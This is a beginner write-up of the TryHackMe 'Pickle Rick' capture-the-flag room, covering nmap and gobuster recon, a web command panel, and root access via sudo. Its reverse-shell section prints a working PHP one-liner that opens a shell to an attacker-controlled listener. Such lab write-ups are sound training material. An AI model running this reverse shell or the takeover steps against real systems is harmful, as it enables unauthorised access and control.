# Pickle Rick - TryHackMe Write-up

- **Platform:** [TryHackMe](https://tryhackme.com/)
- **Room:** Pickle Rick
- **Difficulty:**  Easy
- **Category:** Boot2Root
- **Tools Used:** Kali Linux

## Challenge Overview

Beginner-friendly web application CTF on TryHackMe where the goal is to help Rick turn back into a human by finding three hidden "ingredients" (flags).


<img width="1141" height="532" alt="image" src="https://github.com/user-attachments/assets/55290bfe-3cd9-4b06-b68b-72fbc1955882" />


---


## Recon

<details>
<summary>Click here</summary>
<br>


First, i start with nmap scanning :

```bash
nmap -Pn -sC -sV -T4 <IP ADDRESS> -x php,html,txt,zip
```

- -Pn : skip ping scanning
- -sC : default scanning
- sV : tell version of the software
- -T4 : make the scanning faster


<img width="780" height="300" alt="image" src="https://github.com/user-attachments/assets/798c3c27-1a78-4a4d-b5b3-b2f8720b3371" />

<br>

we found there is 2 port open.

- 80 http
- 22 ssh

Let see what http port give us :
<br>

<img width="1547" height="605" alt="image" src="https://github.com/user-attachments/assets/44a84f96-cc28-41eb-9ea2-007d5a31fb1c" />

now try inspect this browser :

<img width="775" height="397" alt="image" src="https://github.com/user-attachments/assets/18603404-d5eb-4200-90a7-3a7e5555684c" />


ahaa we found a clue. an username

since there is no other clue. i try to gobuster and let see is there any other diretories that we can access :

```bash
gobuster dir -u http://10.49.189.175/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,zip
```

- -x php,html,txt,zip : it find file extension that end with php, html,txt or zip


<img width="992" height="717" alt="image" src="https://github.com/user-attachments/assets/94298a2a-c400-43fc-8797-64015b327228" />


we found

- robots.txt
- login.php

let see what in those 2 directories :

**robots.txt**

<img width="646" height="192" alt="image" src="https://github.com/user-attachments/assets/53b4f56e-d7af-4303-baf0-f38d334afd38" />


Another clue here.

Let see what in login.php directories :

<br>

<img width="1307" height="668" alt="image" src="https://github.com/user-attachments/assets/224b0462-3b42-4533-9870-9e3cab2e4143" />

this login page show 2 input form for username and passsword. we can try to insert those 2 credintials with clue that we found earlier

<br>

<img width="1287" height="355" alt="image" src="https://github.com/user-attachments/assets/dd3770dc-b0ee-4f3a-8f38-6512dc34f24a" />


it redirect us to portal.php page. this page have command input and execute button. so i assume this is terminal.

i try to type ls command it show this :

<br>

<img width="535" height="398" alt="image" src="https://github.com/user-attachments/assets/b935115b-56a0-4961-b5f7-31d825d3274b" />

it show some directories that we can access. 

```Sup3rS3cretPickl3Ingred.txt``` seeems interesting. let see what in it :
<br>

<img width="770" height="160" alt="image" src="https://github.com/user-attachments/assets/d99274e9-b8e5-4d4f-b2f7-19e10c6b9285" />



ahaa we found the first ingredient. ( flag )


Now we try explore other directories :

<br>

<img width="661" height="127" alt="image" src="https://github.com/user-attachments/assets/1fa1575d-f9ee-4546-9f9d-29cf7fbe0336" />


hmmm since this environment is kinda restrictive . we will tried reverse shell. 


</details>

---



## Reverse Shell
<details>
<summary>Click here</summary>
 <br> 

At first i try to know whether this server availble for php or not so i try 

``` bash
which php
``` 

<img width="407" height="276" alt="image" src="https://github.com/user-attachments/assets/15119bda-2126-4f30-b8a2-6e383a69222b" />


We had php availabel on the server. no let execute php reverse shell command. you can get the command [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- change : 10.0.0.1
- change : 1234

And then we setup the listener at another terminal :

<img width="262" height="35" alt="image" src="https://github.com/user-attachments/assets/5812ef46-78ea-445e-a3a2-84742fbce2cb" />

And we execute the php reverse shell command :

<img width="756" height="222" alt="image" src="https://github.com/user-attachments/assets/d0b636d8-2945-4c8a-ab36-3d7ec32f0c95" />

<br>

go back to our listener terminal and then we will successfully got the shell

<img width="556" height="127" alt="image" src="https://github.com/user-attachments/assets/b84553db-6fec-40af-8c5d-44f6eb7f0941" />

</details>

---


## Exploration

<details>
<summary>Click here</summary>
<br>


After we got the shell, let us explore.

And then we will found another hint which is 

<img width="325" height="127" alt="image" src="https://github.com/user-attachments/assets/e89d0298-dfe9-4406-afb3-8fe19681c39b" />

<br>

let see what is inside "second ingredints"

<img width="330" height="67" alt="image" src="https://github.com/user-attachments/assets/b617f611-3234-4ca9-b897-273ccc3bbe93" />


we found another ingredients here ! ( flag )



</details>

---


## Privilege Escalation

<details>
<summary>Click here</summary>


Now to find the last ingredients, it might be in the root so let see what this user can do

```bash
sudo -l
```

<img width="790" height="175" alt="image" src="https://github.com/user-attachments/assets/bdbb2454-402c-418e-8232-df120dcbbb3c" />


<br>

this user is allowed to run every single command on the entire system as root without asking for a password.

Now type 

```bash
sudo -i
```

<br>

notes :
> <img width="711" height="527" alt="image" src="https://github.com/user-attachments/assets/843cb4d4-d0ed-4f07-9221-9e7a14c234b5" />


And then explore a little bit and then we found the last ingredients :

<img width="422" height="172" alt="image" src="https://github.com/user-attachments/assets/bdc232b0-d349-4bd8-93dd-1e9e40faa00f" />

</details>
